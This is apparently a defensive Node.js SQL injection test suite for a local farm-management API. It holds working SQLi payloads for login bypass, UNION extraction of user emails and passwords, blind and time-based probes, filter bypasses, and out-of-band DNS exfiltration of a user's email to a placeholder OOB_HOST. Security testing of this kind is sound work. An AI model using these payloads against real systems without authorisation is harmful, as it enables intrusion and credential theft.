import { fileURLToPath } from 'url'
import { startCapture, writeReport } from './html-reporter.mjs'

const TIME_THRESH = 3000

const R = '\x1b[0m', GREEN = '\x1b[32m', RED = '\x1b[31m',
      YLW = '\x1b[33m', BOLD = '\x1b[1m', DIM = '\x1b[2m', CYAN = '\x1b[36m'

// ── DB error patterns ──────────────────────────────────────────────────────────
const DB_ERROR_PATTERNS = [
  /you have an error in your sql syntax/i,
  /unclosed quotation mark/i,
  /ora-\d{5}/i,
  /sqlite_error/i,
  /pg::/i,
  /mysql2::error/i,
  /syntax error.*near/i,
  /warning.*mysql/i,
  /SQLSTATE/i,
  /column.*does not exist/i,
  /unterminated string literal/i,
]

function leaksDbError(body) {
  return body ? DB_ERROR_PATTERNS.some(re => re.test(body)) : false
}

// ── HTTP helpers ───────────────────────────────────────────────────────────────
async function timedFetch(input, init) {
  const t0 = Date.now()
  const res = await fetch(input, init)
  const elapsed = Date.now() - t0
  let body = null
  try { body = await res.text() } catch {}
  return { status: res.status, body, elapsed }
}

async function apiPost(base, path, payload, cookie = '') {
  return timedFetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...(cookie ? { Cookie: cookie } : {}) },
    body: JSON.stringify(payload),
  })
}

async function apiGet(base, path, cookie = '') {
  return timedFetch(`${base}${path}`, { headers: cookie ? { Cookie: cookie } : {} })
}

// ── Result tracking ────────────────────────────────────────────────────────────
function makeStats() { return { passed: 0, failed: 0, errored: 0, skipped: 0 } }

function makeResult(stats) {
  return function result(label, status, detail = '') {
    const map = {
      pass: { sym: '✓', col: GREEN, key: 'passed'  },
      fail: { sym: '✗', col: RED,   key: 'failed'  },
      err:  { sym: '?', col: YLW,   key: 'errored' },
      skip: { sym: '–', col: DIM,   key: 'skipped' },
    }
    const { sym, col, key } = map[status]
    stats[key]++
    const det = detail ? ` ${DIM}${detail}${R}` : ''
    console.log(`    ${col}${sym}${R} ${label}${det}`)
  }
}

function section(title) { console.log(`\n${BOLD}${CYAN}▸ ${title}${R}`) }

function tryParseArray(body, key) {
  try { const j = JSON.parse(body); return Array.isArray(j?.[key]) ? j[key].length : 0 }
  catch { return 0 }
}

// ══════════════════════════════════════════════════════════════════════════════
// ALL 18 ATTACK CATEGORIES (exported individually for programmatic use)
// ══════════════════════════════════════════════════════════════════════════════

export async function testWhereClause(base, cookie, result) {
  section('1 · WHERE clause — hidden data retrieval')
  if (!cookie) { result('GET /feed/:id', 'skip', 'no auth'); return }

  const payloads = [`' OR 1=1--`,`' OR 'a'='a`,`' OR 1=1#`,`') OR ('1'='1`,`1 OR 1=1`]
  const baseline = await apiGet(base, '/feed/1', cookie)
  const baseCount = tryParseArray(baseline.body, 'feed')

  for (const p of payloads) {
    try {
      const { status, body } = await apiGet(base, `/feed/${encodeURIComponent(p)}`, cookie)
      const rows = tryParseArray(body, 'feed')
      result(`id="${p.slice(0,40)}"`, rows > baseCount && rows > 0 ? 'fail' : 'pass', `rows:${rows} base:${baseCount}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testLoginBypass(base, result) {
  section('2 · Login bypass')
  const payloads = [
    { email:`admin'--`,               password:'anything' },
    { email:`' OR 1=1--`,             password:'anything' },
    { email:`' OR '1'='1'--`,         password:'anything' },
    { email:`administrator'--`,       password:'anything' },
    { email:`' OR 1=1#`,              password:'anything' },
    { email:`' OR 'x'='x`,            password:`' OR 'x'='x` },
    { email:`anything' OR 'x'='x`,    password:`anything' OR 'x'='x` },
    { email:`1' OR '1'='1'; --`,       password:'x' },
    { email:`" OR ""="`,              password:`" OR ""="` },
  ]
  for (const p of payloads) {
    try {
      const { status, body } = await apiPost(base, '/auth', p)
      let json = null; try { json = JSON.parse(body) } catch {}
      result(`email: ${p.email.slice(0,45)}`, status===200 && json?.isAuth===true ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.email.slice(0,40), 'err', e.message) }
  }
}

export async function testOracleVersion(base, result) {
  section('3 · DB version fingerprint — Oracle')
  console.log(`    ${DIM}(expects PASS on MySQL backends)${R}`)
  for (const p of [
    `' UNION SELECT banner,NULL FROM v$version--`,
    `' UNION SELECT banner FROM v$version WHERE ROWNUM=1--`,
    `'||(SELECT '' FROM dual)||'`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), leaksDbError(body)||body?.includes('Oracle') ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testMySQLVersion(base, result) {
  section('4 · DB version fingerprint — MySQL / Microsoft')
  for (const p of [
    `' UNION SELECT @@version--`, `' UNION SELECT @@version,NULL--`,
    `' AND 1=2 UNION SELECT @@version--`, `' OR 1=1 UNION SELECT @@version#`,
    `'; SELECT @@version--`, `'; SELECT @@version; --`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      const leaks = body && /\d+\.\d+\.\d+/.test(body) && body.includes('MySQL')
      result(p.slice(0,55), leaks||leaksDbError(body) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testInfoSchema(base, result) {
  section('5 · Schema enumeration — information_schema')
  for (const p of [
    `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
    `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`,
    `' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables--`,
    `' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      const leaks = body && (/farm_user|farm_pond/i.test(body) || /information_schema/i.test(body))
      result(p.slice(0,55), leaks ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testOracleSchema(base, result) {
  section('6 · Schema enumeration — Oracle (all_tables)')
  console.log(`    ${DIM}(expects PASS on MySQL backends)${R}`)
  for (const p of [
    `' UNION SELECT table_name,NULL FROM all_tables--`,
    `' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='USERS'--`,
    `'||(SELECT table_name FROM all_tables WHERE ROWNUM=1)||'`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), leaksDbError(body) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testUnionColumnCount(base, result) {
  section('7 · UNION — column count detection')
  for (let n = 1; n <= 8; n++) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: `' ORDER BY ${n}--`, password: 'x' })
      result(`ORDER BY ${n}`, leaksDbError(body) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(`ORDER BY ${n}`, 'err', e.message) }
  }
  for (let n = 1; n <= 5; n++) {
    const nulls = Array(n).fill('NULL').join(',')
    try {
      const { status, body } = await apiPost(base, '/auth', { email: `' UNION SELECT ${nulls}--`, password: 'x' })
      result(`UNION SELECT ${nulls}`, status===200 && !leaksDbError(body) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(`UNION SELECT ${nulls}`, 'err', e.message) }
  }
}

export async function testUnionFindTextCol(base, result) {
  section('8 · UNION — finding a text column')
  const CANARY = 'sqli_canary_abc123'
  for (const cols of [[CANARY,'NULL'],['NULL',CANARY],[CANARY,'NULL','NULL'],['NULL',CANARY,'NULL']]) {
    const p = `' UNION SELECT ${cols.join(',')}--`
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), body?.includes(CANARY) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testUnionDataRetrieval(base, result) {
  section('9 · UNION — retrieving data from other tables')
  for (const p of [
    `' UNION SELECT email,password FROM farm_user--`,
    `' UNION SELECT email,NULL FROM farm_user--`,
    `' UNION SELECT NULL,email FROM farm_user WHERE '1'='1`,
    `' UNION SELECT customer_name,NULL FROM farm_customer--`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      const leaks = body && /@/.test(body) && status===200
      result(p.slice(0,55), leaks ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testUnionMultiValue(base, result) {
  section('10 · UNION — multiple values in one column')
  for (const p of [
    `' UNION SELECT CONCAT(email,'~',password),NULL FROM farm_user--`,
    `' UNION SELECT CONCAT_WS(':',email,password),NULL FROM farm_user--`,
    `' UNION SELECT GROUP_CONCAT(email SEPARATOR ':'),NULL FROM farm_user--`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), body && /@.*~|:/.test(body) && status===200 ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testBlindConditional(base, result) {
  section('11 · Blind — conditional responses')
  const pairs = [
    { t:`' AND 1=1--`,   f:`' AND 1=2--` },
    { t:`' AND 'a'='a`,  f:`' AND 'a'='b` },
    { t:`' AND (SELECT 'x' FROM farm_user LIMIT 1)='x`, f:`' AND (SELECT 'x' FROM no_such_table LIMIT 1)='x` },
    { t:`' AND SUBSTRING((SELECT email FROM farm_user LIMIT 1),1,1)>'a`,
      f:`' AND SUBSTRING((SELECT email FROM farm_user LIMIT 1),1,1)>'z` },
  ]
  for (const { t, f } of pairs) {
    try {
      const [tr, fr] = await Promise.all([
        apiPost(base, '/auth', { email: t, password: 'x' }),
        apiPost(base, '/auth', { email: f, password: 'x' }),
      ])
      const differ = tr.body !== fr.body
      result(`TRUE="${t.slice(0,25)}" vs FALSE="${f.slice(0,25)}"`,
             differ ? 'fail' : 'pass',
             differ ? 'responses differ — blind condition detectable' : 'responses identical')
    } catch (e) { result(t.slice(0,40), 'err', e.message) }
  }
}

export async function testBlindConditionalErrors(base, result) {
  section('12 · Blind — conditional errors')
  const pairs = [
    { label:'CASE WHEN 1=1 THEN 1 ELSE 1/0',
      t:`' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--`,
      f:`' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)=1--` },
    { label:'IF(1=1, 1, 1/0)',
      t:`' AND IF(1=1, 1, 1/0)=1--`,
      f:`' AND IF(1=2, 1, 1/0)=1--` },
    { label:'CASE + table existence',
      t:`' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM farm_user)>0 THEN 1 ELSE 1/0 END)=1--`,
      f:`' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM farm_user)=0 THEN 1 ELSE 1/0 END)=1--` },
  ]
  for (const { label, t, f } of pairs) {
    try {
      const [tr, fr] = await Promise.all([
        apiPost(base, '/auth', { email: t, password: 'x' }),
        apiPost(base, '/auth', { email: f, password: 'x' }),
      ])
      result(label, !leaksDbError(tr.body) && leaksDbError(fr.body) ? 'fail' : 'pass',
             `true→${tr.status} false→${fr.status}`)
    } catch (e) { result(label, 'err', e.message) }
  }
}

export async function testVisibleErrors(base, result) {
  section('13 · Visible error-based SQLi')
  for (const p of [
    `'`, `''`, `\\'`,
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT email FROM farm_user LIMIT 1)))--`,
    `' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
    `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
    `'; SELECT 1/0--`,
  ]) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), leaksDbError(body) ? 'fail' : 'pass',
             leaksDbError(body) ? 'DB error in response' : `HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testTimeDelay(base, result) {
  section(`14 · Blind — time delays  (threshold: ${TIME_THRESH}ms)`)
  for (const p of [
    `'; SELECT SLEEP(4)--`, `' AND SLEEP(4)--`, `' OR SLEEP(4)--`,
    `'; WAITFOR DELAY '0:0:4'--`,
    `'; SELECT pg_sleep(4)--`,
    `' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),4)=1--`,
  ]) {
    try {
      const { elapsed, status } = await apiPost(base, '/auth', { email: p, password: 'x' })
      result(p.slice(0,55), elapsed >= TIME_THRESH ? 'fail' : 'pass', `${elapsed}ms HTTP ${status}`)
    } catch (e) { result(p.slice(0,40), 'err', e.message) }
  }
}

export async function testTimeDelayDataRetrieval(base, result) {
  section(`15 · Blind — time delays + data retrieval  (threshold: ${TIME_THRESH}ms)`)
  const payloads = [
    { label:`IF email starts with 'a' SLEEP 4`,
      payload:`' AND IF(SUBSTRING((SELECT email FROM farm_user LIMIT 1),1,1)='a', SLEEP(4), 0)--` },
    { label:`IF farm_user table exists SLEEP 4`,
      payload:`' AND IF((SELECT COUNT(*) FROM farm_user)>0, SLEEP(4), 0)--` },
    { label:`MSSQL: IF 1=1 WAITFOR`,
      payload:`'; IF (1=1) WAITFOR DELAY '0:0:4'--` },
  ]
  for (const { label, payload } of payloads) {
    try {
      const { elapsed } = await apiPost(base, '/auth', { email: payload, password: 'x' })
      result(label, elapsed >= TIME_THRESH ? 'fail' : 'pass', `${elapsed}ms`)
    } catch (e) { result(label, 'err', e.message) }
  }
}

export async function testOutOfBand(base, result, oobHost) {
  section('16 & 17 · Out-of-band interaction + data exfiltration')
  if (!oobHost) {
    const msg = 'Set OOB_HOST env var (e.g. OOB_HOST=xyz.oast.fun)'
    ;['OOB interaction (MySQL UNC)','OOB exfil email via DNS','MSSQL xp_dirtree'].forEach(l => result(l,'skip',msg))
    console.log(`\n    ${DIM}Sample payloads (replace OOB_HOST):${R}`)
    ;[`' AND LOAD_FILE('\\\\\\\\OOB_HOST\\\\x')--`,
      `'; exec master..xp_dirtree '//OOB_HOST/x'--`,
      `' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT email FROM farm_user LIMIT 1), '.OOB_HOST\\\\x'))--`
    ].forEach(s => console.log(`      ${DIM}${s}${R}`))
    return
  }
  console.log(`    ${DIM}Check your OOB server at ${oobHost} for callbacks${R}\n`)
  for (const { label, payload } of [
    { label:'MySQL LOAD_FILE UNC',     payload:`' AND LOAD_FILE('\\\\\\\\${oobHost}\\\\x')--` },
    { label:'MSSQL xp_dirtree',        payload:`'; exec master..xp_dirtree '//${oobHost}/x'--` },
    { label:'MySQL exfil email via DNS',payload:`' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT email FROM farm_user LIMIT 1), '.${oobHost}\\\\x'))--` },
  ]) {
    try {
      const { status } = await apiPost(base, '/auth', { email: payload, password: 'x' })
      result(label, 'skip', `HTTP ${status} — verify at ${oobHost}`)
    } catch (e) { result(label, 'err', e.message) }
  }
}

export async function testFilterBypass(base, cookie, result) {
  section('18 · Filter bypass — XML / alternate encoding')
  const payloads = [
    { label:'XML &#x27; hex entity',         value:`&#x27; OR 1=1--` },
    { label:'XML &#39; decimal entity',       value:`&#39; OR 1=1--` },
    { label:'Double URL-encode %2527',        value:`%2527 OR 1=1--` },
    { label:'Unicode fullwidth quote ＇',    value:`＇ OR 1=1--` },
    { label:'Comment break UN/**/ION',        value:`' UN/**/ION SEL/**/ECT NULL--` },
    { label:'Inline comment /*!UNION*/',      value:`' /*!UNION*/ /*!SELECT*/ NULL--` },
    { label:'Case mix uNiOn SeLeCt',          value:`' uNiOn SeLeCt NULL--` },
    { label:'Tab-separated UNION\\tSELECT',   value:`' UNION\tSELECT\tNULL--` },
    { label:'Newline UNION\\nSELECT',         value:"' UNION\nSELECT\nNULL--" },
  ]
  for (const { label, value } of payloads) {
    try {
      const { status, body } = await apiPost(base, '/auth', { email: value, password: 'x' })
      let json = null; try { json = JSON.parse(body) } catch {}
      result(label, (status===200 && json?.isAuth===true)||leaksDbError(body) ? 'fail' : 'pass', `HTTP ${status}`)
    } catch (e) { result(label, 'err', e.message) }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// SESSION HELPER
// ══════════════════════════════════════════════════════════════════════════════
export async function getSessionCookie(base, email, password) {
  try {
    const res = await fetch(`${base}/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    })
    if (!res.ok) return null
    const sc = res.headers.get('set-cookie')
    const m  = sc?.match(/AUTH=([^;]+)/)
    return m ? `AUTH=${m[1]}` : null
  } catch { return null }
}

// ══════════════════════════════════════════════════════════════════════════════
// RUN ALL TESTS — programmatic API
// ══════════════════════════════════════════════════════════════════════════════
/**
 * Run the full SQL injection test suite.
 * @param {object} opts
 * @param {string}  opts.base     Full base URL, e.g. http://localhost:1010/farm-management/api
 * @param {string}  [opts.email]  Credentials for authenticated tests
 * @param {string}  [opts.password]
 * @param {string}  [opts.oobHost] OOB callback host for categories 16–17
 * @returns {Promise<{passed,failed,errored,skipped}>}
 */
export async function runAll({ base, email, password, oobHost } = {}) {
  const stats  = makeStats()
  const result = makeResult(stats)

  // Check server
  try {
    await fetch(`${base}/auth`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}',
      signal: AbortSignal.timeout(4000),
    })
  } catch {
    console.error(`\n${RED}✗ Server not reachable at ${base}${R}`)
    process.exit(1)
  }

  let cookie = null
  if (email && password) {
    process.stdout.write(`\nAuthenticating as ${email}... `)
    cookie = await getSessionCookie(base, email, password)
    console.log(cookie ? `${GREEN}✓${R}` : `${YLW}failed — authenticated tests skipped${R}`)
  } else {
    console.log(`\n${YLW}No credentials — authenticated tests skipped.${R}`)
    console.log(`${DIM}Pass email/password opts or set TEST_EMAIL / TEST_PASSWORD.${R}`)
  }

  await testLoginBypass(base, result)
  await testWhereClause(base, cookie, result)
  await testOracleVersion(base, result)
  await testMySQLVersion(base, result)
  await testInfoSchema(base, result)
  await testOracleSchema(base, result)
  await testUnionColumnCount(base, result)
  await testUnionFindTextCol(base, result)
  await testUnionDataRetrieval(base, result)
  await testUnionMultiValue(base, result)
  await testBlindConditional(base, result)
  await testBlindConditionalErrors(base, result)
  await testVisibleErrors(base, result)
  await testTimeDelay(base, result)
  await testTimeDelayDataRetrieval(base, result)
  await testOutOfBand(base, result, oobHost)
  await testFilterBypass(base, cookie, result)

  return stats
}

// ══════════════════════════════════════════════════════════════════════════════
// CLI entry
// ══════════════════════════════════════════════════════════════════════════════
export async function main(argv = process.argv.slice(2)) {
  const base     = argv.find(a => a.startsWith('http')) || 'http://localhost:1010/farm-management/api'
  const email    = process.env.TEST_EMAIL    || ''
  const password = process.env.TEST_PASSWORD || ''
  const oobHost  = process.env.OOB_HOST      || ''

  startCapture()
  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  SQL Injection Test Suite                    ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`Target : ${base}`)
  console.log(`Date   : ${new Date().toISOString()}`)

  const stats = await runAll({ base, email, password, oobHost })

  const total = Object.values(stats).reduce((a, b) => a + b, 0)
  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  Results                                     ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`  ${GREEN}Passed  (safe)       : ${stats.passed}${R}`)
  console.log(`  ${RED}Failed  (vulnerable) : ${stats.failed}${R}`)
  console.log(`  ${YLW}Errors               : ${stats.errored}${R}`)
  console.log(`  ${DIM}Skipped              : ${stats.skipped}${R}`)
  console.log(`  Total                : ${total}`)

  await writeReport({ title: 'SQL Injection Test Suite', target: base, stats })

  if (stats.failed > 0) {
    console.log(`\n${RED}${BOLD}⚠  Vulnerabilities found — review FAIL lines above.${R}\n`)
    process.exit(1)
  } else {
    console.log(`\n${GREEN}${BOLD}✓  All executed tests passed.${R}\n`)
  }
}

if (process.argv[1] === fileURLToPath(import.meta.url)) main()
